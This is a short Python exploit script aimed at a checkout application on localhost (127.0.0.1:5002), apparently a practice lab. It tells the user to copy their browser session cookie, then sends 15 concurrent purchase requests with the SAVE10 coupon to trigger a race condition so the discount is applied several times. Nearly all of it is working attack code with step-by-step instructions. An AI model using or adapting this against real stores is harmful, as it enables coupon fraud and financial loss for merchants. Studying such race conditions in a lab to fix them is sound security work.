#!/usr/bin/env python3
"""
Quick Race Condition Exploit for Browser Users
==============================================

After you've applied your coupon in the browser:
1. Keep the checkout page open (DON'T click purchase yet)
2. Run this script in terminal
3. It will exploit the race condition with your session
4. Check your browser for the results

Make sure you have items in cart with SAVE10 coupon applied!
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def exploit_race_condition():
    print("üöÄ Quick Race Condition Exploit")
    print("=" * 50)
    
    # You need to replace these with your actual browser session cookies
    print("üìã Instructions:")
    print("1. Open browser Developer Tools (F12)")
    print("2. Go to Application/Storage tab ‚Üí Cookies")
    print("3. Find 'session' cookie value from http://127.0.0.1:5002")
    print("4. Paste it below when prompted")
    print()
    
    session_cookie = input("üç™ Enter your session cookie value: ").strip()
    
    if not session_cookie:
        print("‚ùå No session cookie provided. Exiting.")
        return
    
    # Setup session with your cookie
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    print(f"\nüéØ Launching race condition attack...")
    print(f"üè∑Ô∏è  Using SAVE10 coupon")
    print(f"‚ö° Sending 15 concurrent requests...")
    
    def send_purchase():
        try:
            response = session.post('http://127.0.0.1:5002/purchase', 
                                  data={'coupon_code': 'SAVE10'},
                                  allow_redirects=False)
            return response.status_code in [200, 302]
        except:
            return False
    
    # Launch concurrent requests
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(send_purchase) for _ in range(15)]
        results = [f.result() for f in futures]
    
    successful = sum(results)
    print(f"\nüìä Results:")
    print(f"   Successful requests: {successful}/15")
    
    if successful > 1:
        print(f"üö® RACE CONDITION EXPLOITED!")
        print(f"   Multiple coupon applications occurred!")
        print(f"   Go back to your browser and check the results!")
    else:
        print(f"‚ÑπÔ∏è  Race condition didn't work this time. Try again.")

if __name__ == "__main__":
    exploit_race_condition()
